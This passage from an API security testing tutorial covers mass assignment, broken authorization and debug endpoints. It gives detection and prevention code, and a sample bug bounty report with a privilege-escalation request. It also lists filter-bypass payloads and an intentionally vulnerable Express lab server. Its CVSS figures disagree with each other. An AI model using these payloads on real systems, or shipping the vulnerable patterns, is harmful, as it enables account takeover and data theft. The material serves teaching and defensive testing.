            const currentPath = path ? `${path}.${key}` : key;
            pm.expect(sensitiveFields).to.not.include(
                key.toLowerCase(),
                `Sensitive field found: ${currentPath}`
            );
            if (typeof value === 'object' && value !== null) {
                checkObject(value, currentPath);
            }
        }
    }

    checkObject(body);
});

// Test for BOLA: swap user ID
pm.test("No BOLA vulnerability", function () {
    if (pm.response.code === 200) {
        const body = pm.response.json();
        // If we requested another user's data and got 200, flag it
        if (body.id && body.id !== pm.environment.get("current_user_id")) {
            pm.expect.fail("BOLA: accessed another user's data");
        }
    }
});
```

**Insomnia Approach:**

1. Import OpenAPI spec via "Import/Export" > "Import Data."
2. Create multiple "Environments" (Admin, Regular User, Unauthenticated).
3. Use "Request Chaining" to automatically extract tokens from login responses.
4. Test each endpoint against all three environments.
5. Use the "Tag" feature to inject dynamic values (timestamps, UUIDs).

---

## 13. Common Developer Mistakes

### Mistake 1: Trusting the Frontend

```javascript
// The frontend only shows username and email fields in the form.
// The developer assumes no one will send additional fields.
// This is the root cause of mass assignment.
```

### Mistake 2: Global Authentication Without Authorization

```javascript
// Developer adds authMiddleware to all routes -- feels secure.
// But authMiddleware only verifies the JWT is valid.
// It does NOT check if the user has permission for this specific resource.
app.use('/api', authMiddleware); // Authentication only
// Missing: per-route authorization checks
```

### Mistake 3: Returning Raw Database Objects

```python
# Django: return JsonResponse(model_to_dict(user)) -- leaks everything
# FastAPI: return user -- leaks everything without response_model
# Express: res.json(user.toObject()) -- leaks everything
```

### Mistake 4: Inconsistent Authorization Across Versions

```
v2/admin/users -> has admin check
v1/admin/users -> has NO admin check (legacy code, nobody maintained it)
```

### Mistake 5: Rate Limiting at the Application Layer Only

Application-level rate limiting trusts client-supplied headers like `X-Forwarded-For`. Always rate-limit at the infrastructure level (AWS WAF, Cloudflare, nginx) using the true client IP.

### Mistake 6: Hardcoding API Keys in Frontend Code

```javascript
// React component -- this ships to every browser
const STRIPE_SECRET_KEY = "sk_live_XXXXXXXXXXXXXXXXXXXX"; // NEVER DO THIS
// Only publishable keys belong in frontend code
```

---

## 14. Detection Strategies

### Application-Level Detection

```javascript
// Express.js: Middleware to detect mass assignment attempts
function detectMassAssignment(allowedFields) {
  return (req, res, next) => {
    const submittedFields = Object.keys(req.body);
    const suspiciousFields = submittedFields.filter(
      field => !allowedFields.includes(field)
    );

    if (suspiciousFields.length > 0) {
      // Log the attempt
      console.warn('[SECURITY] Mass assignment attempt detected', {
        ip: req.ip,
        user: req.user?.id,
        endpoint: req.originalUrl,
        suspicious_fields: suspiciousFields,
        timestamp: new Date().toISOString()
      });

      // Alert SOC team if critical fields are present
      const criticalFields = ['role', 'isAdmin', 'is_admin', 'balance',
                              'permissions', 'privilege', 'admin'];
      const criticalAttempt = suspiciousFields.some(
        f => criticalFields.includes(f.toLowerCase())
      );

      if (criticalAttempt) {
        alertSOC({
          type: 'PRIVILEGE_ESCALATION_ATTEMPT',
          ip: req.ip,
          user: req.user?.id,
          fields: suspiciousFields
        });
      }
    }
    next();
  };
}

// Usage
app.put('/api/v1/users/profile',
  authMiddleware,
  detectMassAssignment(['username', 'email', 'avatar', 'bio']),
  updateProfileHandler
);
```

### Infrastructure-Level Detection

```bash
# AWS WAF rule to block requests with suspicious JSON fields
# (using AWS WAF JSON body inspection)
aws wafv2 create-rule-group \
  --name "block-mass-assignment" \
  --scope REGIONAL \
  --capacity 50 \
  --rules '[{
    "Name": "block-role-field",
    "Priority": 1,
    "Action": {"Block": {}},
    "Statement": {
      "ByteMatchStatement": {
        "SearchString": "\"role\"",
        "FieldToMatch": {"Body": {"OversizeHandling": "CONTINUE"}},
        "TextTransformations": [{"Priority": 0, "Type": "LOWERCASE"}],
        "PositionalConstraint": "CONTAINS"
      }
    },
    "VisibilityConfig": {
      "SampledRequestsEnabled": true,
      "CloudWatchMetricsEnabled": true,
      "MetricName": "block-role-field"
    }
  }]'
```

### Log Analysis Queries

```bash
# CloudWatch Logs Insights: find mass assignment attempts
fields @timestamp, @message
| filter @message like /suspicious_fields/
| stats count(*) as attempts by ip, user
| sort attempts desc
| limit 50

# Find 403 spikes (indicates BFLA probing)
fields @timestamp, status_code, path, user_id
| filter status_code = 403
| stats count(*) as blocked by user_id, path
| sort blocked desc
| limit 50
```

---

## 15. Prevention Strategies

### Input Validation Layer

```python
# FastAPI: Use separate models for each operation
class UserCreateInput(BaseModel):
    """What the user can send during registration."""
    username: str = Field(..., min_length=3, max_length=50, regex=r'^[a-zA-Z0-9_]+$')
    email: EmailStr
    password: str = Field(..., min_length=12)

class UserUpdateInput(BaseModel):
    """What the user can modify on their profile."""
    username: str | None = Field(None, min_length=3, max_length=50)
    bio: str | None = Field(None, max_length=500)
    avatar_url: HttpUrl | None = None

class AdminUserUpdate(BaseModel):
    """What an admin can modify on any user."""
    role: str | None = None
    is_active: bool | None = None
    is_verified: bool | None = None

class UserResponse(BaseModel):
    """What any user sees about themselves."""
    id: int
    username: str
    email: str
    bio: str | None
    avatar_url: str | None

class AdminUserResponse(BaseModel):
    """What admins see."""
    id: int
    username: str
    email: str
    role: str
    is_active: bool
    is_verified: bool
    created_at: datetime
    last_login: datetime | None
```

### Authorization Middleware Pattern

```javascript
// Express.js: Composable authorization middleware
const authorize = {
  // Check if user owns the resource
  isOwner: (getResourceOwnerId) => async (req, res, next) => {
    const ownerId = await getResourceOwnerId(req);
    if (ownerId !== req.user.id) {
      return res.status(403).json({ error: 'Forbidden: not the owner' });
    }
    next();
  },

  // Check if user has required role
  hasRole: (...roles) => (req, res, next) => {
    if (!roles.includes(req.user.role)) {
      return res.status(403).json({ error: 'Forbidden: insufficient role' });
    }
    next();
  },

  // Check if user owns the resource OR has admin role
  isOwnerOrAdmin: (getResourceOwnerId) => async (req, res, next) => {
    if (req.user.role === 'admin') return next();
    const ownerId = await getResourceOwnerId(req);
    if (ownerId !== req.user.id) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    next();
  }
};

// Usage
router.get('/users/:id',
  authMiddleware,
  authorize.isOwnerOrAdmin(req => req.params.id),
  getUser
);

router.delete('/admin/users/:id',
  authMiddleware,
  authorize.hasRole('admin'),
  deleteUser
);
```

### API Gateway Rate Limiting (AWS)

```yaml
# AWS API Gateway usage plan
Resources:
  ApiUsagePlan:
    Type: AWS::ApiGateway::UsagePlan
    Properties:
      UsagePlanName: standard-rate-limit
      Throttle:
        BurstLimit: 20
        RateLimit: 10  # 10 requests per second
      Quota:
        Limit: 10000
        Period: DAY
      ApiStages:
        - ApiId: !Ref ApiGateway
          Stage: prod

  # Separate, stricter plan for auth endpoints
  AuthUsagePlan:
    Type: AWS::ApiGateway::UsagePlan
    Properties:
      UsagePlanName: auth-rate-limit
      Throttle:
        BurstLimit: 5
        RateLimit: 2  # 2 requests per second for login/register
      Quota:
        Limit: 100
        Period: HOUR
```

### Nginx Rate Limiting (Infrastructure Level)

```nginx
# /etc/nginx/conf.d/rate-limit.conf

# Define rate limit zones based on true client IP (not X-Forwarded-For)
limit_req_zone $binary_remote_addr zone=api_general:10m rate=10r/s;
limit_req_zone $binary_remote_addr zone=api_auth:10m rate=2r/s;
limit_req_zone $binary_remote_addr zone=api_admin:10m rate=5r/s;

server {
    location /api/v1/auth/ {
        limit_req zone=api_auth burst=5 nodelay;
        limit_req_status 429;
        proxy_pass http://backend;
    }

    location /api/v1/admin/ {
        limit_req zone=api_admin burst=10 nodelay;
        limit_req_status 429;
        proxy_pass http://backend;
    }

    location /api/ {
        limit_req zone=api_general burst=20 nodelay;
        limit_req_status 429;
        proxy_pass http://backend;
    }
}
```

---

## 16. Bug Bounty Report Example

### Report: Mass Assignment Leading to Privilege Escalation

**Title:** Mass Assignment on PUT /api/v1/users/profile Allows Any User to Escalate to Admin

**Severity:** Critical (CVSS 9.8)

**Affected Endpoint:** `PUT /api/v1/users/profile`

**Summary:**

The `/api/v1/users/profile` endpoint accepts arbitrary JSON fields in the request body and persists them to the database without validation. An authenticated user with the `user` role can send `{"role": "admin"}` in the body to escalate their privileges to administrator, gaining full access to all admin functions including user management, data export, and system configuration.

**Steps to Reproduce:**

1. Register a new account at `https://app.target.com/register` using email `attacker@test.com` and password `SecurePass123!`.
2. Log in and capture the JWT token from the `Authorization` header.
3. Send the following request:

```http
PUT /api/v1/users/profile HTTP/1.1
Host: api.target.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Type: application/json

{
  "role": "admin"
}
```

4. Observe the response: `{"user": {"id": 1042, "username": "attacker", "role": "admin"}}`.
5. Access `GET /api/v1/admin/users` with the same token. The request succeeds, confirming admin access.
6. The attacker can now delete users, modify billing, export all customer data, and modify system settings.

**Impact:**

- Complete privilege escalation from regular user to administrator.
- Access to all user PII (names, emails, addresses, payment information).
- Ability to modify or delete any user account.
- Access to system configuration and billing settings.
- Full compromise of the application's authorization model.

**Remediation:**

1. Implement strict field whitelisting on the update endpoint. Only allow `username`, `email`, `avatar`, and `bio` to be modified through this endpoint.
2. Use separate data transfer objects (DTOs) for input validation -- never pass raw request bodies to the ORM.
3. Add server-side validation that rejects requests containing `role`, `isAdmin`, `balance`, `permissions`, or any other privileged field.
4. Implement audit logging for any successful or attempted role changes.

**CVSS Vector:** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` = 8.8 (High) or Critical depending on the actual admin capabilities.

---

## 17. Common Bypass Techniques

### Bypass Field Name Filters

If the server blocks `role`, try alternate casings, encodings, and synonyms:

```json
{"Role": "admin"}
{"ROLE": "admin"}
{"rOlE": "admin"}
{"user_role": "admin"}
{"userRole": "admin"}
{"account_role": "admin"}
{"access_level": "admin"}
{"privilege": "admin"}
{"group": "administrators"}
{"user_type": "admin"}
{"type": "admin"}
```

### Bypass via Content-Type Manipulation

```http
# Standard JSON (blocked)
Content-Type: application/json
{"role": "admin"}

# Try XML if the parser supports it
Content-Type: application/xml
<user><role>admin</role></user>

# Try form-encoded
Content-Type: application/x-www-form-urlencoded
role=admin

# Try multipart
Content-Type: multipart/form-data; boundary=----Boundary
------Boundary
Content-Disposition: form-data; name="role"

admin
------Boundary--
```

### Bypass via Nested Objects

```json
{"user": {"role": "admin"}}
{"profile": {"role": "admin"}}
{"data": {"role": "admin"}}
{"attributes": {"role": "admin"}}
```

### Bypass via Array Injection

```json
{"role[]": "admin"}
{"role": ["admin", "user"]}
```

### Bypass via JSON Pollution

```json
{"role": "user", "role": "admin"}
```

Some JSON parsers take the last duplicate key, while the validation logic checks the first.

---

## 18. Lab Setup Ideas

### Local API Security Testing Lab

**Docker Compose for Vulnerable API:**

```yaml
# docker-compose.yml
version: '3.8'
services:
  vulnerable-api:
    build: ./vulnerable-api
    ports:
      - "3000:3000"
    environment:
      - MONGO_URI=mongodb://mongo:27017/vulnapp
      - JWT_SECRET=super-secret-key-123
      - NODE_ENV=production
    depends_on:
      - mongo

  mongo:
    image: mongo:7
    ports:
      - "27017:27017"
    volumes:
      - mongo_data:/data/db

  burp-collaborator:
    image: portswainer/collaborator
    ports:
      - "8443:8443"

volumes:
  mongo_data:
```

**Vulnerable Express.js API (Dockerfile):**

```dockerfile
FROM node:20-alpine
WORKDIR /app
COPY package*.json ./
RUN npm install
COPY . .
EXPOSE 3000
CMD ["node", "server.js"]
```

**server.js -- Intentionally Vulnerable:**

```javascript
const express = require('express');
const mongoose = require('mongoose');
const jwt = require('jsonwebtoken');

const app = express();
app.use(express.json());

mongoose.connect(process.env.MONGO_URI);

const userSchema = new mongoose.Schema({
  username: String,
  email: String,
  password: String,
  role: { type: String, default: 'user' },
  isAdmin: { type: Boolean, default: false },
  balance: { type: Number, default: 100 },
  is_verified: { type: Boolean, default: false }
});

const User = mongoose.model('User', userSchema);

// Swagger endpoint (intentionally exposed)
app.get('/swagger.json', (req, res) => {
  res.json({
    openapi: '3.0.0',
    paths: {
      '/api/v1/users/register': { post: { /* ... */ } },
      '/api/v1/users/profile': { get: {}, put: {} },
      '/api/v1/admin/users': { get: {} },
      '/api/v1/admin/users/{id}': { delete: {} },
      '/api/v1/admin/config': { get: {} },
      '/debug/users': { get: {} },
      '/debug/config': { get: {} },
    }
  });
});

// Mass assignment vulnerable registration
app.post('/api/v1/users/register', async (req, res) => {
  const user = new User(req.body);
  await user.save();
  const token = jwt.sign({ id: user._id, role: user.role }, process.env.JWT_SECRET);
  res.status(201).json({ token, user });
});

// Mass assignment vulnerable update
app.put('/api/v1/users/profile', auth, async (req, res) => {
  const user = await User.findByIdAndUpdate(req.userId, req.body, { new: true });
  res.json({ user });
});

// BFLA: no role check on admin endpoints
app.get('/api/v1/admin/users', auth, async (req, res) => {
  const users = await User.find({});
  res.json({ users });
});

app.delete('/api/v1/admin/users/:id', auth, async (req, res) => {
  await User.findByIdAndDelete(req.params.id);
  res.json({ message: 'Deleted' });
});

// Debug endpoints left in "production"
app.get('/debug/users', async (req, res) => {
  const users = await User.find({});
  res.json(users);
});

app.get('/debug/config', (req, res) => {
  res.json({
    db: process.env.MONGO_URI,
    secret: process.env.JWT_SECRET
  });
});

// Auth middleware (authentication only, no authorization)
function auth(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No token' });
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.userId = decoded.id;
    req.userRole = decoded.role;
    next();
  } catch {
    res.status(401).json({ error: 'Invalid token' });
  }
}

app.listen(3000, () => console.log('Vulnerable API on :3000'));
```

### Existing Vulnerable Labs

- **OWASP crAPI** (Completely Ridiculous API): Purpose-built vulnerable API with all OWASP API Top 10 vulnerabilities. `docker-compose` deployment.
- **vAPI** (Vulnerable API): Minimalist vulnerable REST API. GitHub: `roottusk/vapi`.
- **DVGA** (Damn Vulnerable GraphQL Application): For GraphQL API testing.
- **Juice Shop**: OWASP's comprehensive vulnerable web app with a rich REST API.

---

## 19. Severity Explanation

| Vulnerability | Typical Severity | CVSS Range | Justification |
|---|---|---|---|
| Mass assignment (privilege escalation) | Critical | 8.8 - 9.8 | Direct admin access |
| BFLA (access admin functions) | High - Critical | 7.5 - 9.8 | Unauthorized function access |
| BOPLA (read sensitive data) | Medium - High | 5.3 - 7.5 | Data exposure scope dependent |
| BOPLA (write privileged fields) | High - Critical | 7.5 - 9.8 | Same as mass assignment |
| Swagger exposure (with internal endpoints) | Medium | 5.3 - 6.5 | Information disclosure |
| Debug endpoint exposure | High - Critical | 7.5 - 9.8 | Depends on data exposed |
| API key leakage | High - Critical | 7.5 - 9.8 | Depends on key permissions |
| Rate limiting bypass | Low - Medium | 3.1 - 5.3 | Enables brute force |
| API versioning auth gap | High - Critical | 7.5 - 9.8 | Depends on accessible function |
| Excessive data exposure | Medium - High | 5.3 - 7.5 | Depends on data sensitivity |

---

## 20. Conclusion

API security testing is where the real vulnerabilities hide. While web application firewalls and frontend frameworks have raised the bar for traditional web vulnerabilities, APIs remain a soft target because developers trust that the client will only send "expected" data and only access "visible" endpoints.

The techniques covered in this guide -- hidden parameter discovery, mass assignment, BFLA, BOPLA, mobile API reverse engineering, debug endpoint exploitation, API versioning attacks, rate limiting bypasses, and API key abuse -- represent the core methodology of an advanced API security tester. Every one of these techniques has produced real critical findings in production applications and bug bounty programs.

The key takeaway: never trust the client. Validate every input against an explicit whitelist. Authorize every request against the user's actual permissions, not just their authentication status. Return only the data the user is authorized to see. And assume that every endpoint, every parameter, and every API version will be discovered and tested by someone who reads guides like this one.

---

## Call to Action

Start by auditing your own APIs today. Pick one endpoint, run Arjun against it, and check if it accepts hidden parameters. Install Autorize in Burp Suite and test every endpoint with a different user's token. Check if your Swagger spec is publicly accessible. Search your organization's GitHub repositories for leaked API keys. These are low-effort, high-reward tests that consistently find critical vulnerabilities.

Set up the Docker lab from this guide and practice the full methodology before your next bug bounty engagement. The attack surface is massive, the techniques are reliable, and most targets have never been tested this way.
